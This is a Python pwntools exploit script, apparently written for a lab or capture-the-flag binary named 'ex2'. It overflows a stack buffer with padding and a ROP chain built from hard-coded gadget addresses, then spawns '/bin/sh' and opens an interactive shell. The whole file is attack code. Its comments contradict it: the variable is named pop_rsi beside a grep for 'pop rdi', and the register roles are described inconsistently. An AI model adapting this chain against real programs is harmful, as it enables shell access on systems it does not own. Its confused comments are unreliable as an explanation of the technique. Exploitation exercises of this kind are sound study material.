#!/usr/bin/env python3


from pwn import *

exe = context.binary = ELF('./bin/ex2')


ephemereal = next(exe.search(b'/bin/sh'))

pop_rsi = p64(0x00000000004012b1)  #ROPgadget --binary ./bin/ex2 | grep 'pop rdi'
align = p64(0x000000000040101a)
souldream = p64(0x404080)

rop = pop_rsi  # Set rsi, rdi, and rbp                         # Set rsi to NULL (second argument for execve)
rop += souldream                   # Set rdi to '/bin/sh' (first argument for execve)
rop+= p64(0)                            # Set rbp to 0 (filler value)
rop+= p64(0x0000000000401346)                      


payload = b"/bin/sh\00"
payload += 64 * b'A'
payload += align
payload += rop



p = process(exe.path)

p.sendline(payload)  

p.interactive()


